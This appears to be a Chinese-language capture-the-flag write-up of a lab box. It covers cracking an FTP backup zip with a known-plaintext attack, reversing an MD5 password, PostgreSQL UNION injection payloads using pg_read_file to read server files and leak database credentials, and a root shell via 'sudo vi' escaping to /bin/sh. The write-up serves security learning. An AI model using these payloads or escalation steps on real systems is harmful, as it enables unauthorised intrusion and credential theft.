nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142039413.png)

---

在ftp中存在备份文件

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142041594.png)

但是要密码,注意到压缩包中存在`style.css`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142050308.png)

同时网站中也存在`style.css`,可以尝试进行已知明文攻击

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142051594.png)

注意在压缩`style.css`时要在linux上进行压缩,否则APCHPR会报错

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142115144.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142116334.png)

见[backup_decrypted](backup_decrypted)

```php
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
...
```

`2cb42f8734ea607eefed3b70af13bbd3`反查结果为`qwerty789`

成功登录

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142120666.png)

报错`ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%1'%' ^`

`?search=1%' union select null,version(),null,null,null--+`确认数据库类型为`PostgreSQL`,`PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.2.1-9ubuntu2) 9.2.1 20191008, 64-bit`

`?search=1%' union select null,pg_ls_dir('/var/www/html'),null,null,null--+`列出路径

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142219299.png)

`?search=1%' union select null,pg_read_file('/var/www/html/dashboard.php', 0, 20000),null,null,null--+`读取`dashboard.php`

```php
<?php
session_start();
if ($_SESSION['login'] !== "true") {
    header("Location: index.php");
    die();
}
try {
    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
} catch (exception $e) {
    echo $e->getMessage();
}

if (isset($_REQUEST['search'])) {
    $q = "Select * from cars where name ilike '%" . $_REQUEST["search"] . "%'";
    $result = pg_query($conn, $q);
    if (!$result) {
        die(pg_last_error($conn));
    }
    while ($row = pg_fetch_array($result, NULL, PGSQL_NUM)) {
        echo "
    <tr>
    <td class='lalign'>$row[1]</td>
    <td>$row[2]</td>
    <td>$row[3]</td>
    <td>$row[4]</td>
    </tr>";
    }
} else {
    $q = "Select * from cars";
    $result = pg_query($conn, $q);
    if (!$result) {
        die(pg_last_error($conn));
    }
    while ($row = pg_fetch_array($result, NULL, PGSQL_NUM)) {
        echo "
    <tr>
    <td class='lalign'>$row[1]</td>
    <td>$row[2]</td>
    <td>$row[3]</td>
    <td>$row[4]</td>
    </tr>";
    }
}
?>
```

利用`user=postgres password=P@s5w0rd!`成功连接

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142232342.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142237751.png)

`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`

`:set shell=/bin/sh`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142305737.png)

`:shell`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142309871.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201142310205.png)